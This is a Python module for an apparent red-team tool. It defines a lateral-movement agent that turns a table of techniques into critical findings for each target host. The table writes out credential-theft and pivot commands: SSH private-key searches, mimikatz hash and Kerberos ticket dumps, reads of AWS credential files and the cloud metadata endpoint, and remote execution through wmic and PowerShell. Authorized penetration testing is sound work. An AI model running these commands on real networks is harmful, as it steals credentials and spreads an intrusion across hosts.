from __future__ import annotations

import logging

from bugfinder.agents.base import AgentContext, AgentResult, BaseAgent
from bugfinder.core.types import Confidence, Severity

logger = logging.getLogger(__name__)

LATERAL_MOVEMENT_TECHNIQUES = [
    {
        "id": "ssh_key_pivot",
        "title": "SSH Key Discovery and Pivot",
        "technique": "ssh_key_reuse",
        "description": "Discovers SSH private keys on compromised hosts and tests them against other hosts in the network for credential reuse",
        "commands": [
            "find / -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null",
            "find / -name 'authorized_keys' -o -name 'known_hosts' 2>/dev/null",
            "cat ~/.ssh/config 2>/dev/null",
        ],
    },
    {
        "id": "pass_the_hash",
        "title": "Pass-the-Hash (Windows)",
        "technique": "pass_the_hash",
        "description": "Uses extracted NTLM hashes to authenticate to remote Windows systems without knowing the plaintext password",
        "commands": [
            "sekurlsa::logonpasswords",
            "lsadump::sam",
            'wmic /node:{TARGET} process call create "{COMMAND}"',
        ],
        "tools": ["impacket-wmiexec", "crackmapexec", "mimikatz"],
    },
    {
        "id": "kerberos_pivot",
        "title": "Kerberos Ticket Reuse (Pass-the-Ticket)",
        "technique": "pass_the_ticket",
        "description": "Extracts Kerberos TGT/TGS tickets from compromised hosts for lateral movement",
        "commands": [
            "sekurlsa::tickets /export",
            "kerberos::ptt ticket.kirbi",
        ],
        "tools": ["mimikatz", "impacket-ticketer"],
    },
    {
        "id": "aws_cred_pivot",
        "title": "AWS Credential Pivot",
        "technique": "cloud_credential_reuse",
        "description": "Discovers AWS credentials and attempts to use them against other AWS services/accounts",
        "commands": [
            "cat ~/.aws/credentials 2>/dev/null",
            "env | grep AWS_ 2>/dev/null",
            "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null",
        ],
    },
    {
        "id": "ps_remoting",
        "title": "PowerShell Remoting",
        "technique": "winrm_pivot",
        "description": "Uses PowerShell Remoting (WinRM) to execute commands on remote Windows systems",
        "commands": [
            "Invoke-Command -ComputerName {TARGET} -ScriptBlock { {COMMAND} } -Credential $cred",
            "Enter-PSSession -ComputerName {TARGET}",
        ],
    },
    {
        "id": "ssh_agent_forwarding",
        "title": "SSH Agent Forwarding Abuse",
        "technique": "ssh_agent_pivot",
        "description": "Abuses SSH agent forwarding to authenticate to additional hosts from a jump box",
        "commands": [
            "echo $SSH_AUTH_SOCK",
            "ssh-add -l",
            'ssh -o "ForwardAgent yes" user@{TARGET}',
        ],
    },
]


class LateralMovementAgent(BaseAgent):
    name = "redteam.lateral_movement"
    description = "Identifies and executes lateral movement techniques across network hosts"
    category = "redteam"

    def __init__(self, context: AgentContext) -> None:
        super().__init__(context)

    async def execute(self) -> AgentResult:
        findings = []
        assets = []

        target = self.context.target
        target_hosts = self.context.config.get("target_hosts", [target])
        techniques = self.context.config.get("techniques", [t["id"] for t in LATERAL_MOVEMENT_TECHNIQUES])

        for host in target_hosts:
            for tech in LATERAL_MOVEMENT_TECHNIQUES:
                if tech["id"] not in techniques:
                    continue

                commands = [cmd.replace("{TARGET}", host).replace("{COMMAND}", "whoami") for cmd in tech["commands"]]

                finding = {
                    "id": f"lateral-{tech['id']}-{host.replace('.', '-').replace(':', '-')}",
                    "title": tech["title"],
                    "description": tech["description"],
                    "severity": Severity.CRITICAL.value,
                    "confidence": Confidence.LIKELY.value,
                    "category": "redteam.lateral_movement",
                    "evidence": f"Lateral movement technique '{tech['id']}' identified for target {host}",
                    "remediation": "Segment network, enforce least privilege, monitor for suspicious authentication patterns",
                    "technique": tech["technique"],
                    "target_host": host,
                    "commands": commands,
                    "tools": tech.get("tools", []),
                }
                findings.append(finding)

                assets.append(
                    {
                        "id": f"pivot-target-{host.replace('.', '-').replace(':', '-')}",
                        "type": "pivot_target",
                        "host": host,
                        "technique": tech["technique"],
                        "compromised": False,
                    }
                )

        return AgentResult(
            agent_name=self.name,
            status="completed",
            findings=findings,
            assets=assets,
            summary=f"Mapped {len(findings)} lateral movement paths across {len(target_hosts)} hosts",
            data={"hosts_scanned": len(target_hosts), "techniques": len(findings)},
        )
